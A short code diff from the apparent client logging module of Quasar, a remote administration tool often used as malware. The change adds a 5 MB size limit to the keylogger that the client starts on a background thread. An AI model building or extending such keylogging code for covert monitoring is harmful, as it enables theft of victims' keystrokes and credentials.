@@ -32,7 +32,7 @@ namespace Quasar.Client.Logging
             _msgLoopThread = new Thread(() =>
             {
                 _msgLoop = new ApplicationContext();
-                _keylogger = new Keylogger(15000);
+                _keylogger = new Keylogger(15000, 5 * 1024 * 1024);
                 _keylogger.Start();
                 Application.Run(_msgLoop);
             });
